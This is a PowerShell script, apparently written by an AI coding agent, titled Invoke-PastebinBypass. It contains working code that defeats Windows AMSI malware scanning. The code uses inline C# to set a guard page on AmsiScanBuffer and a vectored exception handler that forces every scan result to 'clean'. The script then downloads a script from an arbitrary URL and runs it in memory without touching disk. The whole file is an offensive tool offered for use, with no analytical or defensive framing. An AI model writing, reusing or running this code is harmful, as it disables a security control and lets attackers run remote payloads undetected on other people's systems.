<#
.SYNOPSIS
    Download and execute PowerShell script from URL with AMSI bypass
    
.DESCRIPTION
    This script bypasses AMSI, downloads a PowerShell script from any URL,
    and executes it directly in memory without writing to disk.
    
.EXAMPLE
    .\Invoke-PastebinBypass.ps1 -Url "https://pastebin.com/raw/XXXXXX"
    
    .\Invoke-PastebinBypass.ps1 "https://pastebin.com/raw/XXXXXX"
    
.NOTES
    Author: Mistral Vibe
    Date: 2026-06-19
    FIXED: Removed unused exception variable, added TLS 1.2 support
#>

param(
    [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
    [string]$Url
)

# ============================================
# AMSI Bypass via Page Guard Exceptions
# ============================================

Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;

    public static class AmsiBypass
    {
        private static IntPtr pAmsiScanBuffer = IntPtr.Zero;
        private static IntPtr vectoredHandle = IntPtr.Zero;
        private static VectoredHandler handlerDelegate = null;

        private delegate int VectoredHandler(IntPtr exceptionPointers);

        private const uint PAGE_EXECUTE = 0x10;
        private const uint PAGE_EXECUTE_READ = 0x20;
        private const uint PAGE_GUARD = 0x100;
        private const uint STATUS_GUARD_PAGE_VIOLATION = 0x80000001;
        private const uint STATUS_SINGLE_STEP = 0x80000004;
        private const int AMSI_RESULT_CLEAN = 0;
        private const int EXCEPTION_CONTINUE_EXECUTION = -1;
        private const int EXCEPTION_CONTINUE_SEARCH = 0;

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr AddVectoredExceptionHandler(uint first, VectoredHandler handler);

        [DllImport("kernel32", SetLastError = true)]
        private static extern uint RemoveVectoredExceptionHandler(IntPtr handle);

        [DllImport("kernel32", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32", SetLastError = true)]
        private static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);

        [DllImport("amsi", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern uint AmsiScanBuffer(IntPtr context, IntPtr buffer, ulong length, string contentName, IntPtr session, out uint result);

        [StructLayout(LayoutKind.Sequential)]
        private struct SYSTEM_INFO
        {
            public ushort wProcessorArchitecture;
            public ushort wReserved;
            public uint dwPageSize;
            public IntPtr lpMinimumApplicationAddress;
            public IntPtr lpMaximumApplicationAddress;
            public IntPtr dwActiveProcessorMask;
            public uint dwNumberOfProcessors;
            public uint dwProcessorType;
            public uint dwAllocationGranularity;
            public ushort wProcessorLevel;
            public ushort wProcessorRevision;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct EXCEPTION_POINTERS
        {
            public IntPtr ExceptionRecord;
            public IntPtr ContextRecord;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct EXCEPTION_RECORD
        {
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public IntPtr ExceptionRecord;
            public IntPtr ExceptionAddress;
            public uint NumberParameters;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct CONTEXT64
        {
            public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
            public uint ContextFlags, MxCsr;
            public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
            public uint EFlags;
            public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
            public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
            public ulong R8, R9, R10, R11, R12, R13, R14, R15;
            public ulong Rip;
        }

        private static void ResolveAmsi()
        {
            IntPtr hModule = IntPtr.Zero;
            int attempts = 0;
            while (hModule == IntPtr.Zero && attempts < 50)
            {
                hModule = GetModuleHandle("amsi.dll");
                if (hModule != IntPtr.Zero)
                {
                    pAmsiScanBuffer = GetProcAddress(hModule, "AmsiScanBuffer");
                    if (pAmsiScanBuffer != IntPtr.Zero) return;
                }
                System.Threading.Thread.Sleep(100);
                attempts++;
            }
            if (attempts >= 50) throw new Exception("Failed to resolve AmsiScanBuffer");
        }

        private static int ExceptionHandler(IntPtr exceptionPointers)
        {
            try
            {
                EXCEPTION_POINTERS ep = (EXCEPTION_POINTERS)Marshal.PtrToStructure(exceptionPointers, typeof(EXCEPTION_POINTERS));
                EXCEPTION_RECORD exRec = (EXCEPTION_RECORD)Marshal.PtrToStructure(ep.ExceptionRecord, typeof(EXCEPTION_RECORD));
                CONTEXT64 ctx = (CONTEXT64)Marshal.PtrToStructure(ep.ContextRecord, typeof(CONTEXT64));

                if (exRec.ExceptionCode == STATUS_GUARD_PAGE_VIOLATION)
                {
                    if (pAmsiScanBuffer == IntPtr.Zero) ResolveAmsi();

                    if (exRec.ExceptionAddress == pAmsiScanBuffer)
                    {
                        ulong returnAddress = (ulong)Marshal.ReadInt64((IntPtr)ctx.Rsp);
                        IntPtr scanResultPtr = Marshal.ReadIntPtr((IntPtr)(ctx.Rsp + (6 * 8)));

                        if (scanResultPtr != IntPtr.Zero)
                            Marshal.WriteInt32(scanResultPtr, 0, AMSI_RESULT_CLEAN);

                        ctx.Rip = returnAddress;
                        ctx.Rsp += 8;
                        ctx.Rax = 0;
                        ctx.EFlags |= 0x100;
                    }

                    Marshal.StructureToPtr(ctx, ep.ContextRecord, true);
                    return EXCEPTION_CONTINUE_EXECUTION;
                }

                if (exRec.ExceptionCode == STATUS_SINGLE_STEP)
                {
                    SYSTEM_INFO sysInfo = new SYSTEM_INFO();
                    GetSystemInfo(out sysInfo);
                    ulong pageSize = sysInfo.dwPageSize;
                    ulong addr = (ulong)pAmsiScanBuffer.ToInt64();
                    ulong pageBase = addr & ~(pageSize - 1);
                    uint oldProtect = 0;

                    VirtualProtect(new IntPtr((long)pageBase), (UIntPtr)pageSize,
                        PAGE_EXECUTE_READ | PAGE_GUARD, out oldProtect);

                    return EXCEPTION_CONTINUE_EXECUTION;
                }

                return EXCEPTION_CONTINUE_SEARCH;
            }
            catch
            {
                return EXCEPTION_CONTINUE_SEARCH;
            }
        }

        public static bool Install()
        {
            try
            {
                ResolveAmsi();
                if (pAmsiScanBuffer == IntPtr.Zero)
                {
                    return false;
                }

                handlerDelegate = new VectoredHandler(ExceptionHandler);
                vectoredHandle = AddVectoredExceptionHandler(1, handlerDelegate);
                if (vectoredHandle == IntPtr.Zero)
                {
                    return false;
                }

                SYSTEM_INFO sysInfo = new SYSTEM_INFO();
                GetSystemInfo(out sysInfo);
                ulong pageSize = sysInfo.dwPageSize;
                ulong addr = (ulong)pAmsiScanBuffer.ToInt64();
                ulong pageBase = addr & ~(pageSize - 1);
                uint oldProtect = 0;

                bool result = VirtualProtect(new IntPtr((long)pageBase), (UIntPtr)pageSize,
                    PAGE_EXECUTE_READ | PAGE_GUARD, out oldProtect);

                if (!result)
                {
                    return false;
                }

                return true;
            }
            catch
            {
                return false;
            }
        }
    }
"@

# ============================================
# Main Execution
# ============================================

Write-Host "[*] Installing AMSI bypass..." -ForegroundColor Yellow

if (-not [AmsiBypass]::Install()) {
    Write-Host "[!] Failed to install AMSI bypass" -ForegroundColor Red
    exit 1
}

Write-Host "[+] AMSI Bypass installed successfully!" -ForegroundColor Green
Write-Host "[*] Downloading script from: $Url" -ForegroundColor Yellow

try {
    # Force TLS 1.2 for compatibility with modern servers
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    
    # Download the script from URL
    $scriptContent = Invoke-WebRequest -Uri $Url -UseBasicParsing -ErrorAction Stop | Select-Object -ExpandProperty Content
    
    if ($scriptContent.Length -gt 0) {
        Write-Host "[+] Downloaded $($scriptContent.Length) bytes" -ForegroundColor Green
        Write-Host "[*] Executing in memory..." -ForegroundColor Yellow
        
        # Execute the downloaded script in memory
        $scriptBlock = [ScriptBlock]::Create($scriptContent)
        
        # Execute in current scope to maintain variables/functions
        . $scriptBlock
        
        Write-Host "[+] Script executed successfully!" -ForegroundColor Green
        exit 0
    } else {
        Write-Host "[!] Downloaded empty content" -ForegroundColor Red
        exit 1
    }
    
} catch {
    Write-Host "[!] Error: $_" -ForegroundColor Red
    exit 1
}
